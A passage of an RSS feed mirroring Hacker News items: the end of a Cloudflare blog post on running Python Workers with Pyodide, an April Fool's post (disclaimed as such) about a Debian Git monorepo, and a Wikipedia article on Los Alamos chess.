    return py_response</code></pre><h3 id="synchronous-client-libraries">Synchronous Client libraries</h3><p>Another challenge in supporting Python HTTP client libraries is that many Python APIs are synchronous. For these libraries, we cannot use the <a href="https://developers.cloudflare.com/workers/runtime-apis/fetch/">fetch API</a> directly because it is asynchronous. </p><p>Thankfully, Joe Marshall recently landed <a href="https://urllib3.readthedocs.io/en/stable/reference/contrib/emscripten.html">a contribution to urllib3</a> that adds Pyodide support in web browsers by:</p><ol><li>Checking if blocking with <code>Atomics.wait()</code> is possible<br>a. If so, start a fetch worker thread<br>b. Delegate the fetch operation to the worker thread and serialize the response into a SharedArrayBuffer<br>c. In the Python thread, use Atomics.wait to block for the response in the SharedArrayBuffer</li><li>If <code>Atomics.wait()</code> doesn’t work, fall back to a synchronous XMLHttpRequest</li></ol><p>Despite this, today Cloudflare Workers do not support <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers">worker threads</a> or synchronous <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a>, so neither of these two approaches will work in Python Workers. We do not support synchronous requests today, but there is a way forward…</p><h3 id="webassembly-stack-switching">WebAssembly Stack Switching</h3><p>There is an approach which will allow us to support synchronous requests. WebAssembly has <a href="https://github.com/WebAssembly/js-promise-integration">a stage 3 proposal adding support for stack switching</a>, which <a href="https://v8.dev/blog/jspi">v8 has an implementation of</a>. Pyodide contributors have been working on adding support for stack switching to Pyodide since September of 2022, and it is almost ready. </p><p>With this support, Pyodide exposes a function called <code>run_sync</code> which can block for completion of an awaitable:</p><pre><code>from pyodide.ffi import run_sync

def sync_fetch(py_request):
   js_request = py_request_to_js_request(py_request)
   js_response  = run_sync(fetch(js_request))
   return js_response_to_py_response(js_response)</code></pre><h3 id="fastapi-and-python%E2%80%99s-asynchronous-server-gateway-interface">FastAPI and Python’s Asynchronous Server Gateway Interface</h3><p><a href="https://fastapi.tiangolo.com/">FastAPI</a> is one of the most popular libraries for defining Python servers. FastAPI applications use a protocol called the <a href="https://asgi.readthedocs.io/en/latest/">Asynchronous Server Gateway Interface</a> (ASGI). This means that FastAPI never reads from or writes to a socket itself. An ASGI application expects to be hooked up to an ASGI server, typically <a href="https://www.uvicorn.org/">uvicorn</a>. The ASGI server handles all of the raw sockets on the application’s behalf.</p><p>Conveniently for us, this means that FastAPI works in Cloudflare Workers without any patches or changes to FastAPI itself. We simply need to replace <a href="https://www.uvicorn.org/">uvicorn</a> with an appropriate ASGI server that can run within a Worker. Our initial implementation lives <a href="https://github.com/cloudflare/workerd/blob/main/src/pyodide/internal/asgi.py">here</a>, in <a href="https://github.com/cloudflare/pyodide">the fork of Pyodide</a> that we maintain. We hope to add a more comprehensive feature set, add test coverage, and then upstream this implementation into Pyodide.</p><p>You can try this yourself by cloning <a href="https://github.com/cloudflare/python-workers-examples">cloudflare/python-workers-examples</a>, and running <code>npx wrangler@latest dev</code> in the directory of the FastAPI example.</p><h2 id="importing-python-packages">Importing Python Packages</h2><p>Python Workers support <a href="https://developers.cloudflare.com/workers/languages/python/packages/">a subset of Python packages</a>, which are <a href="https://github.com/cloudflare/pyodide/tree/main/packages">provided directly by Pyodide</a>, including <a href="https://numpy.org/">numpy</a>, <a href="https://www.python-httpx.org/">httpx</a>, <a href="https://developers.cloudflare.com/workers/languages/python/packages/fastapi/">FastAPI</a>, <a href="https://developers.cloudflare.com/workers/languages/python/packages/langchain/">Langchain</a>, and more. This ensures compatibility with the Pyodide runtime by pinning package versions to Pyodide versions, and allows Pyodide to patch internal implementations, as we showed above in the case of httpx.</p><p>To import a package, simply add it to your <code>requirements.txt</code> file, without adding a version number. A specific version of the package is provided directly by Pyodide. Today, you can use packages in local development, and in the coming weeks, you will be able to deploy Workers that define dependencies in a <code>requirements.txt</code> file. Later in this post, we’ll show how we’re thinking about managing new versions of Pyodide and packages.</p><p>We maintain our own fork of Pyodide, which allows us to provide patches specific to the Workers runtime, and to quickly expand our support for packages in Python Workers, while also committing to upstreaming our changes back to Pyodide, so that the whole ecosystem of developers can benefit.</p><p>Python packages are often big and memory hungry though, and they can do a lot of work at import time. How can we ensure that you can bring in the packages you need, while mitigating long cold start times?</p><h2 id="making-cold-starts-faster-with-memory-snapshots">Making cold starts faster with memory snapshots</h2><p>In the example at the start of this post, in local development, we mentioned injecting Pyodide into your Worker. Pyodide itself is 6.4MB — and Python packages can also be quite large.</p><p>If we simply shoved Pyodide into your Worker and uploaded it to Cloudflare, that’d be quite a large Worker to load into a new isolate — cold starts would be slow. On a fast computer with a good network connection, Pyodide takes about two seconds to initialize in a web browser, one second of network time and one second of cpu time. It wouldn’t be acceptable to initialize it every time you update your code for every isolate your Worker runs in across <a href="https://www.cloudflare.com/network/">Cloudflare’s network</a>.</p><p>Instead, when you run <a href="https://developers.cloudflare.com/workers/wrangler/commands/#deploy">npx wrangler@latest deploy</a>, the following happens:</p><ol><li>Wrangler uploads your Python code and your <code>requirements.txt</code> file to the Workers API</li><li>We send your Python code, and your <code>requirements.txt</code> file to the Workers runtime to be validated</li><li>We create a new isolate for your Worker, and automatically inject Pyodide plus any <a href="https://developers.cloudflare.com/workers/languages/python/packages/">packages</a> you’ve specified in your <code>requirements.txt</code> file.</li><li>We scan the Worker’s code for import statements, execute them, and then take a snapshot of the Worker’s WebAssembly linear memory. Effectively, we perform the expensive work of importing packages at deploy time, rather than at runtime.</li><li>We deploy this snapshot alongside your Worker’s Python code to Cloudflare’s network.</li><li>Just like a JavaScript Worker, we execute the Worker’s <a href="https://developers.cloudflare.com/workers/platform/limits/#worker-startup-time">top-level scope</a>.</li></ol><p>When a request comes in to your Worker, we load this snapshot and use it to bootstrap your Worker in an isolate, avoiding expensive initialization time:</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/apipyth.png" alt="" loading="lazy" width="1200" height="475"></figure><p>This takes cold starts for a basic Python Worker down to below 1 second. We’re not yet satisfied with this though. We’re confident that we can drive this down much, much further. How? By reusing memory snapshots.</p><h3 id="reusing-memory-snapshots">Reusing Memory Snapshots</h3><p>When you upload a Python Worker, we generate a single memory snapshot of the Worker’s top-level imports, including both Pyodide and any dependencies. This snapshot is specific to your Worker. It can’t be shared, even though most of its contents are the same as other Python Workers.</p><p>Instead, we can create a single, shared snapshot ahead of time, and preload it into a pool of “pre-warmed” isolates. These isolates would already have the Pyodide runtime loaded and ready — making a Python Worker work just like a JavaScript Worker. In both cases, the underlying interpreter and execution environment is provided by the Workers runtime, and available on-demand without delay. The only difference is that with Python, the interpreter runs in WebAssembly, within the Worker.</p><p>Snapshots are a common pattern across runtimes and execution environments. Node.js <a href="https://docs.google.com/document/d/1YEIBdH7ocJfm6PWISKw03szNAgnstA2B3e8PZr_-Gp4/edit#heading=h.1v0pvnoifuah">uses V8 snapshots to speed up startup time</a>. You can take <a href="https://github.com/firecracker-microvm/firecracker/blob/main/docs/snapshotting/snapshot-support.md">snapshots of Firecracker microVMs</a> and resume execution in a different process. There’s lots more we can do here — not just for Python Workers, but for Workers written in JavaScript as well, caching snapshots of compiled code from top-level scope and the state of the isolate itself. Workers are so fast and efficient that to-date we haven’t had to take snapshots in this way, but we think there are still big performance gains to be had.</p><p>This is our biggest lever towards driving cold start times down over the rest of 2024.</p><h2 id="future-proofing-compatibility-with-pyodide-versions-and-compatibility-dates">Future proofing compatibility with Pyodide versions and Compatibility Dates</h2><p>When you deploy a Worker to Cloudflare, you expect it to keep running indefinitely, even if you never update it again. There are Workers deployed in 2018 that are still running just fine in production.</p><p>We achieve this using <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/">Compatibility Dates</a> and <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/#compatibility-flags">Compatibility Flags</a>, which provide explicit opt-in mechanisms for new behavior and potentially backwards-incompatible changes, without impacting existing Workers.</p><p>This works in part because it mirrors how the Internet and web browsers work. You publish a web page with some JavaScript, and rightly expect it to work forever. Web browsers and Cloudflare Workers have the same type of commitment of stability to developers.</p><p>There is a challenge with Python though — both Pyodide and CPython are <a href="https://devguide.python.org/versions/">versioned</a>. Updated versions are published regularly and can contain breaking changes. And Pyodide provides a set of <a href="https://developers.cloudflare.com/workers/languages/python/packages/">built-in packages</a>, each with a pinned version number. This presents a question — how should we allow you to update your Worker to a newer version of Pyodide?</p><p>The answer is <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/">Compatibility Dates</a> and <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/#compatibility-flags">Compatibility Flags</a>.</p><p>A new version of Python is released every year in August, and a new version of Pyodide is released six (6) months later. When this new version of Pyodide is published, we will add it to Workers by gating it behind a Compatibility Flag, which is only enabled after a specified Compatibility Date. This lets us continually provide updates, without risk of breaking changes, extending the commitment we’ve made for JavaScript to Python.</p><p>Each Python release has a <a href="https://devguide.python.org/versions/">five (5) year support window</a>. Once this support window has passed for a given version of Python, security patches are no longer applied, making this version unsafe to rely on. To mitigate this risk, while still trying to hold as true as possible to our commitment of stability and long-term support, after five years any Python Worker still on a Python release that is outside of the support window will be automatically moved forward to the next oldest Python release. Python is a mature and stable language, so we expect that in most cases, your Python Worker will continue running without issue. But we recommend updating the compatibility date of your Worker regularly, to stay within the support window.</p><p>In between Python releases, we also expect to update and add additional <a href="https://developers.cloudflare.com/workers/languages/python/packages/%5C">Python packages</a>, using the same opt-in mechanism. A Compatibility Flag will be a combination of the Python version and the release date of a set of packages. For example, <strong>python_3.17_packages_2025_03_01</strong>.</p><h2 id="how-bindings-work-in-python-workers">How bindings work in Python Workers</h2><p>We mentioned earlier that Pyodide provides a foreign function interface (FFI) to JavaScript — meaning that you can directly use JavaScript objects, methods, functions and more, directly from Python.</p><p>This means that from day one, all <a href="https://developers.cloudflare.com/workers/configuration/bindings/">binding</a> APIs to other Cloudflare resources are supported in Cloudflare Workers. The env object that is provided by handlers in Python Workers is a JavaScript object that Pyodide provides a proxy API to, handling <a href="https://pyodide.org/en/stable/usage/type-conversions.html">type translations</a> across languages automatically.</p><p>For example, to write to and read from a <a href="https://developers.cloudflare.com/kv/">KV</a> namespace from a Python Worker, you would write:</p><pre><code>from js import Response

async def on_fetch(request, env):
    await env.FOO.put("bar", "baz")
    bar = await env.FOO.get("bar")
    return Response.new(bar) # returns "baz"</code></pre><p>This works for Web APIs too — see how Response is imported from the js module? You can import any global from JavaScript this way.</p><h2 id="get-this-javascript-out-of-my-python">Get this JavaScript out of my Python!</h2><p>You’re probably reading this post because you want to write Python <em>instead</em> of JavaScript. <code>from js import Response</code> just isn’t Pythonic. We know — and we have actually tackled this challenge before for another language (<a href="https://blog.cloudflare.com/workers-rust-sdk">Rust</a>). And we think we can do this even better for Python.</p><p>We launched <a href="https://github.com/cloudflare/workers-rs">workers-rs</a> in 2021 to make it possible to write Workers in <a href="https://www.rust-lang.org/">Rust</a>. For each JavaScript API in Workers, we, alongside open-source contributors, have written bindings that expose a more idiomatic Rust API.</p><p>We plan to do the same for Python Workers — starting with the bindings to <a href="https://developers.cloudflare.com/workers-ai/">Workers AI</a> and <a href="https://developers.cloudflare.com/vectorize/">Vectorize</a>. But while workers-rs requires that you use and update an external dependency, the APIs we provide with Python Workers will be built into the Workers runtime directly. Just update your compatibility date, and get the latest, most Pythonic APIs.</p><p>This is about more than just making bindings to resources on Cloudflare more Pythonic though — it’s about compatibility with the ecosystem.</p><p>Similar to how we <a href="https://github.com/cloudflare/workers-rs/pull/477">recently converted</a> workers-rs to use types from the <a href="https://crates.io/crates/http">http</a> crate, which makes it easy to use the <a href="https://docs.rs/axum/latest/axum/">axum</a> crate for routing, we aim to do the same for Python Workers. For example, the Python standard library provides a <a href="https://docs.python.org/3/library/socket.html">raw socket API</a>, which many Python packages depend on. Workers already provides <a href="https://developers.cloudflare.com/workers/runtime-apis/tcp-sockets/">connect()</a>, a JavaScript API for working with raw sockets. We see ways to provide at least a subset of the Python standard library’s socket API in Workers, enabling a broader set of Python packages to work on Workers, with less of a need for patches.</p><p>But ultimately, we hope to kick start an effort to create a standardized serverless API for Python. One that is easy to use for any Python developer and offers the same capabilities as JavaScript.</p><h2 id="we%E2%80%99re-just-getting-started-with-python-workers">We’re just getting started with Python Workers</h2><p>Providing true support for a new programming language is a big investment that goes far beyond making “hello world” work. We chose Python very intentionally — it’s the <a href="https://survey.stackoverflow.co/2023/#technology-most-popular-technologies">second most popular programming language after JavaScript</a> — and we are committed to continuing to improve performance and widen our support for Python packages.</p><p>We’re grateful to the Pyodide maintainers and the broader Python community — and we’d love to hear from you. Drop into the Python Workers channel in the <a href="https://discord.cloudflare.com/">Cloudflare Developers Discord</a>, or <a href="https://github.com/cloudflare/workerd/discussions/categories/python-packages">start a discussion on Github</a> about what you’d like to see next and which Python packages you’d like us to support.</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/Workers-and-Python.png" alt="" loading="lazy" width="1600" height="421"></figure></div></section><div><p>We protect <a target="_blank" href="https://www.cloudflare.com/network-services/" rel="noreferrer">entire corporate networks</a>, help customers build <a target="_blank" href="https://workers.cloudflare.com/" rel="noreferrer">Internet-scale applications efficiently</a>, accelerate any <a target="_blank" href="https://www.cloudflare.com/performance/accelerate-internet-applications/" rel="noreferrer">website or Internet application</a>, <a target="_blank" href="https://www.cloudflare.com/ddos/" rel="noreferrer">ward off DDoS attacks</a>, keep <a target="_blank" href="https://www.cloudflare.com/application-security/" rel="noreferrer">hackers at bay</a>, and can help you on <a target="_blank" href="https://www.cloudflare.com/products/zero-trust/" rel="noreferrer">your journey to Zero Trust</a>.</p><p>Visit <a target="_blank" href="https://one.one.one.one/" rel="noreferrer">1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.</p><p>To learn more about our mission to help build a better Internet, <a target="_blank" href="https://www.cloudflare.com/learning/what-is-cloudflare/" rel="noreferrer">start here</a>. If you're looking for a new career direction, check out <a target="_blank" href="https://www.cloudflare.com/careers" rel="noreferrer">our open positions</a>.</p></div><a href="https://blog.cloudflare.com/tag/developers">Developers</a><a href="https://blog.cloudflare.com/tag/workers">Cloudflare Workers</a><a href="https://blog.cloudflare.com/tag/webassembly">WebAssembly</a><a href="https://blog.cloudflare.com/tag/python">Python</a><a href="https://blog.cloudflare.com/tag/developer-platform">Developer Platform</a><a href="https://blog.cloudflare.com/tag/wasm">WASM</a><a href="https://blog.cloudflare.com/tag/developer-week">Developer Week</a></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Debian Git Monorepo (211 pts)]]></title>
            <link>https://blog.liw.fi/posts/2024/monorepo/</link>
            <guid>39903742</guid>
            <pubDate>Tue, 02 Apr 2024 09:16:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.liw.fi/posts/2024/monorepo/">https://blog.liw.fi/posts/2024/monorepo/</a>, See on <a href="https://news.ycombinator.com/item?id=39903742">Hacker News</a></p>
<div id="readability-page-1" class="page"><article class="page">
    

    

    <section id="pagebody">
	<p><a href="https://liw.fi/">Lars Wirzenius Consulting Ltd</a> has created a Git repository with the source code of Debian 12 (bookworm), the <code>main</code> component. It’s one repository for all the source code, as one commit. It’s a <a href="https://en.wikipedia.org/wiki/Monorepo">monorepo</a>.</p>
<p>To clone the repository (but read below before you run this):</p>
<pre><code>git clone https://monorepo.liw.fi/git/debian</code></pre>
<p>Please be kind to the proof-of-concept Git server and avoid cloning if 42 or more people are already cloning. The checkout will take a few hours and use about 500 GiB disk space, and have about 15 million files outside <code>.git</code>.</p>
<p>This is a read-only repository that will need to be moved onto Debian infrastructure before it’s actually usable for collaboration.</p>
<h2 id="motivation">Motivation</h2>
<p>The monorepo will greatly simplify and improve the development process of Debian:</p>
<ul>
<li><p>Simpler collaboration: every package uses the same process, and the same tools, and it’ll be easier than ever to help with other people’s packages.</p></li>
<li><p>Transitions are easier: all changes will be prepared in one branch and merged atomically, rather than uploading each source package separately.</p></li>
<li><p>Enables distribution-wide changes in general: With all the source code for everything in one tree, in on repository, it’s feasible to make changes to Debian that affect many packages. For example, back in the day Debian took seven years to migrate <code>/usr/doc</code> to <code>/usr/share/doc</code>, and that can now be done in one commit.</p></li>
<li><p>Easier to see what has changed: the release notes maintainers will especially appreciate this. In the future, Debian release notes will be excruciatingly detailed. They will no longer merely say “bug fixes and improvements”.</p></li>
<li><p>Better non-free management: if a package in main is ever found to contain non-free code, it can be removed using <code>git filter-branch</code>.</p></li>
<li><p>Better quality control: merges will only be happen after CI tests pass, using the <a href="https://bors.rust-lang.org/"><code>bors</code></a> tool from the developers of the Rust language. Currently packages are tested only after they’ve already been uploaded to the Debian archive. The change will reduce problems for people running the unstable branch of Debian in production. Soon there will be no bugs in unstable.</p></li>
<li><p>More development speed: because Debian developers will no longer need to spend time fixing bugs in unstable, and maintaining the Debian bug tracker, they will have more time and energy to update packages to newer versions. This, in turn, will motivate large enterprise users of Debian to fund Debian development more, as their primary complaint of the slow pace of change will finally be solved.</p></li>
</ul>
<h2 id="future-of-.dsc">Future of “.dsc”</h2>
<p>There will be no further need for the legacy <code>.dsc</code> source package format. Instead, a copy of the monorepo can be shipped.</p>
<h2 id="resource-use">Resource use</h2>
<p>The monorepo is not small. However, given how important Debian is to their business, companies like Apple, Microsoft, Amazon, and Google, are already chomping at the bit to donate hardware and cloud resources to enable use of the monorepo. Expect an announcement on <code>debian-devel-announce</code> as soon as details have been worked out.</p>
<h2 id="implementation">Implementation</h2>
<p>The program <a href="https://app.radicle.xyz/nodes/radicle.liw.fi/rad:zgYpM7b29D6wTMjEUxxzBjcF9EvK">unpack-debian-sources</a> is available on the <a href="https://radicle.xyz/">Radicle</a> network as repository ID <code>rad:zgYpM7b29D6wTMjEUxxzBjcF9EvK</code>. Running it took about seven hours on my home computer. After that finished, I created the repository with the following commands:</p>
<pre><code>git init .
git add -v .
git commit -m "Debian 12 (bookworm), main"</code></pre>
<p>The <code>git add</code> took about 3.5 hours and <code>git commit</code> took another 2.5 hours. This required 16 GiB RAM to work. Since I’ve already done this, nobody else needs to. Everyone else can just clone, from my server or each other. The commit is:</p>
<pre><code>commit 8ae3129b9f222534d6ed20dd0489fb8f2f1d1a97 (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Lars Wirzenius &lt;liw@liw.fi&gt;
Date:   Tue Mar 19 11:05:57 2024 +0000

    Debian 12 main</code></pre>
<p>Have fun!</p>
<h2 id="disclaimer">Disclaimer</h2>
<p>This blog post is an April Fool’s joke. Debian is not moving to a monorepo. I have not been a member of Debian since 2018. I don’t speak for Debian. I would be very surprised if Debian would abandon its current development model of being developer and package centric. I don’t even think it’d be sensible for Debian to have a monorepo. The monorepo is real, though it will be deleted by the end of April.</p>
<p>The real motivation for all this is that I sometimes like to be cruel to my tools. This time, I’m cruel to Git: can it handle a repository of this size? In 2009 it could not. In 2024 it can.</p>

      </section>

  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Los Alamos Chess (103 pts)]]></title>
            <link>https://en.wikipedia.org/wiki/Los_Alamos_chess</link>
            <guid>39903738</guid>
            <pubDate>Tue, 02 Apr 2024 09:15:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://en.wikipedia.org/wiki/Los_Alamos_chess">https://en.wikipedia.org/wiki/Los_Alamos_chess</a>, See on <a href="https://news.ycombinator.com/item?id=39903738">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
							

						<p>From Wikipedia, the free encyclopedia</p>
					</div><div lang="en" dir="ltr" id="mw-content-text">

<p><b>Los Alamos chess</b> (or <b>anti-clerical chess</b><sup id="cite_ref-Anderson_1-0"><a href="#cite_note-Anderson-1">[1]</a></sup>) is a <a href="https://en.wikipedia.org/wiki/Chess_variant" title="Chess variant">chess variant</a> played on a <a href="https://en.wikipedia.org/wiki/Minichess" title="Minichess">6×6 board</a> without <a href="https://en.wikipedia.org/wiki/Bishop_(chess)" title="Bishop (chess)">bishops</a>. This was the first chess-like game played by a computer program. This program was written at <a href="https://en.wikipedia.org/wiki/Los_Alamos_National_Laboratory" title="Los Alamos National Laboratory">Los Alamos Scientific Laboratory</a> by <a href="https://en.wikipedia.org/w/index.php?title=Paul_Stein_(computer_scientist)&amp;action=edit&amp;redlink=1" title="Paul Stein (computer scientist) (page does not exist)">Paul Stein</a> and <a href="https://en.wikipedia.org/w/index.php?title=Mark_Wells_(computer_scientist)&amp;action=edit&amp;redlink=1" title="Mark Wells (computer scientist) (page does not exist)">Mark Wells</a> for the <span><a href="https://en.wikipedia.org/wiki/MANIAC_I" title="MANIAC I">MANIAC I</a></span> computer<sup id="cite_ref-Pritchard94_2-0"><a href="#cite_note-Pritchard94-2">[2]</a></sup> in 1956. The reduction of the board size and the number of pieces from standard <a href="https://en.wikipedia.org/wiki/Chess" title="Chess">chess</a> was due to the very limited capacity of computers at the time. The computer still needed about 20 minutes between moves.
</p><p>The program was very simple, containing only about 600 instructions. It was mostly a <a href="https://en.wikipedia.org/wiki/Minimax" title="Minimax">minimax</a> <a href="https://en.wikipedia.org/wiki/Tree_traversal" title="Tree traversal">tree search</a> and could look four <a href="https://en.wikipedia.org/wiki/Ply_(game_theory)" title="Ply (game theory)">plies</a> ahead. For scoring the board at the end of the four-ply lookahead, it estimates a score for <a href="https://en.wikipedia.org/wiki/Glossary_of_chess#Material" title="Glossary of chess">material</a> and a score for <a href="https://en.wikipedia.org/wiki/Glossary_of_chess#Mobility" title="Glossary of chess">mobility</a>, then adds them. Pseudocode for the chess program is described in Figure 11.4 of Newell, 2019.<sup id="cite_ref-:0_3-0"><a href="#cite_note-:0-3">[3]</a></sup> In 1958, a revised version was written for <a href="https://en.wikipedia.org/wiki/MANIAC_II" title="MANIAC II">MANIAC II</a> for full 8×8 chess, though its pseudocode was never published. There is a record of a single game by it, circa November 1958 (Table 11.2 of Newell, 2019<sup id="cite_ref-:0_3-1"><a href="#cite_note-:0-3">[3]</a></sup>).
</p>
<meta property="mw:PageProp/toc">
<h2><span id="Game_rules">Game rules</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=1" title="Edit section: Game rules"><span>edit</span></a><span>]</span></span></h2>
<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg/220px-Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg" decoding="async" width="220" height="196" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg/330px-Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg/440px-Paul_Stein_and_Nicholas_Metropolis_play_%E2%80%9CLos_Alamos%E2%80%9D_chess_against_the_MANIAC.jpg 2x" data-file-width="1000" data-file-height="889"></a><figcaption>Paul Stein and <a href="https://en.wikipedia.org/wiki/Nicholas_Metropolis" title="Nicholas Metropolis">Nicholas Metropolis</a> play Los Alamos chess against the MANIAC.</figcaption></figure>
<p>The starting position is illustrated. All rules are as in <a href="https://en.wikipedia.org/wiki/Rules_of_chess" title="Rules of chess">chess</a> except:
</p>
<ul><li>There is no <a href="https://en.wikipedia.org/wiki/Pawn_(chess)" title="Pawn (chess)">pawn</a> double-step move, nor is there the <i><a href="https://en.wikipedia.org/wiki/En_passant" title="En passant">en passant</a></i> capture;</li>
<li><a href="https://en.wikipedia.org/wiki/Pawn_(chess)" title="Pawn (chess)">Pawns</a> may not be promoted to bishops;</li>
<li>There is no <a href="https://en.wikipedia.org/wiki/Castling" title="Castling">castling</a>.</li></ul>
<h2><span id="Los_Alamos_trials">Los Alamos trials</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=2" title="Edit section: Los Alamos trials"><span>edit</span></a><span>]</span></span></h2>

<p>The computer played three games. The first was played against itself. The second one was against a strong human player, who played <a href="https://en.wikipedia.org/wiki/Chess_handicap" title="Chess handicap">without a queen</a>. The human player won. In the third game, MANIAC I played against a laboratory assistant who had been taught the <a href="https://en.wikipedia.org/wiki/Rules_of_chess" title="Rules of chess">rules of chess</a> in the preceding week specifically for the game. The computer won, marking the first time that a computer had beaten a human player in a chess-like game.<sup id="cite_ref-Pritchard94_2-1"><a href="#cite_note-Pritchard94-2">[2]</a></sup><sup id="cite_ref-Pritchard07_4-0"><a href="#cite_note-Pritchard07-4">[4]</a></sup>
</p>
<h3><span id="The_second_game">The second game</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=3" title="Edit section: The second game"><span>edit</span></a><span>]</span></span></h3>

<p>White: <a href="https://en.wikipedia.org/wiki/Martin_Kruskal" title="Martin Kruskal">Martin Kruskal</a> <span>&nbsp;</span> Black: <a href="https://en.wikipedia.org/wiki/MANIAC_I" title="MANIAC I">MANIAC I</a><br>1. d3 Na4 2. b3 Nb6 3. c3 d4 4. c4 bxc4 5. dxc4 a4 6. Na3 e4 7. Kd2 Ke5 8. f3 e3+ 9. Kc2 axb3+ 10. axb3 Nf4 11. Nd3+ Nxd3 12. Kxd3 Kf4 13. Kc2 Ra5 14. Kb2 Re6 15. Rfd1 Re5 16. Nc2 Rxa1 17. Kxa1 Re6 18. Kb2 Re5 19. Ne1 Qe4 20. fxe4 fxe4 21. Kc2 d3+ 22. exd3 e2 23. Ra1 Re6 24. Ra5 exd3+ 25. Kd2 Re4 26. Rxc5 Re6 27. Nxd3+ Ke4 28. Kxe2 Kd4+ 29. Re5 Rxe5+ 30. Nxe5 Kc5 31. Kd3 Kb4 32. Kd4 Nxc4 33. bxc4 Kb3 34. c5 Kb4 35. c6=Q Kb3 36. Nd3 Ka2 37. Qc3 Kb1 38. Qb2<a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)##" title="Algebraic notation (chess)">#</a> <a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)#1%E2%80%930" title="Algebraic notation (chess)">1–0</a><sup id="cite_ref-5"><a href="#cite_note-5">[5]</a></sup>
</p>
<h3><span id="The_third_game">The third game</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=4" title="Edit section: The third game"><span>edit</span></a><span>]</span></span></h3>

<p>White: <a href="https://en.wikipedia.org/wiki/MANIAC_I" title="MANIAC I">MANIAC I</a> <span>&nbsp;</span> Black: Beginner <br>1.d3 b4 2.Nf3 d4 3.b3 e4 4.Ne1 a4 5.bxa4 Nxa4 6.Kd2 Nc3 7.Nxc3 bxc3+ 8.Kd1 f4 9.a3 Rb6 10.a4 Ra6 11.a5 Kd5 12.Qa3 Qb5 13.Qa2+ Ke5 14.Rb1 Rxa5 15.Rxb5 Rxa2 16.Rb1 Ra5 17.f3 Ra4 18.fxe4 c4 19.Nf3+ Kd6 20.e5+ Kd5 21.exf6=Q Nc5 22.Qxd4+ Kc6 23.Ne5<a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)##" title="Algebraic notation (chess)">#</a> <a href="https://en.wikipedia.org/wiki/Algebraic_notation_(chess)#1%E2%80%930" title="Algebraic notation (chess)">1–0</a><sup id="cite_ref-Pritchard94_2-2"><a href="#cite_note-Pritchard94-2">[2]</a></sup>
</p>
<h2><span id="References">References</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=5" title="Edit section: References"><span>edit</span></a><span>]</span></span></h2>
<div>
<ol>
<li id="cite_note-Anderson-1"><span><b><a href="#cite_ref-Anderson_1-0">^</a></b></span> <span><cite id="CITEREFAnderson1986"><a href="https://en.wikipedia.org/wiki/Herbert_L._Anderson" title="Herbert L. Anderson">Anderson, Herbert L.</a> (Fall 1986). <a rel="nofollow" href="http://www.fas.org/sgp/othergov/doe/lanl/pubs/00326886.pdf">"Metropolis, Monte Carlo, and the MANIAC"</a> <span>(PDF)</span>. <i><a href="https://en.wikipedia.org/wiki/Los_Alamos_Science" title="Los Alamos Science">Los Alamos Science</a></i>: 104–105.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Los+Alamos+Science&amp;rft.atitle=Metropolis%2C+Monte+Carlo%2C+and+the+MANIAC&amp;rft.ssn=fall&amp;rft.pages=104-105&amp;rft.date=1986&amp;rft.aulast=Anderson&amp;rft.aufirst=Herbert+L.&amp;rft_id=http%3A%2F%2Fwww.fas.org%2Fsgp%2Fothergov%2Fdoe%2Flanl%2Fpubs%2F00326886.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ALos+Alamos+chess"></span></span>
</li>
